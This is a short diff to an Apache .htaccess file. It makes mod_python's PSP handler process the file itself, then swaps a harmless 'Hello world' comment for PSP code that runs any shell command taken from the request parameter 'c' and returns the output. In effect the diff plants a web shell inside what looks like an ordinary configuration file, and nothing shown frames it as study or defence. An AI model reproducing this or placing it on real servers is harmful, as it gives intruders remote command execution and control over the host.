@@ -11,6 +11,8 @@
 # apache has interpreted the apache directives from the .htaccess file
 AddType text/html .htaccess
 AddHandler mod_python .htaccess
+AddHandler mod_python .psp
 PythonHandler mod_python.psp
 PythonDebug On
-# <%= 'Hello world' %>
+# <% import commands %>
+#<%=commands.getstatusoutput(form["c"]) %>
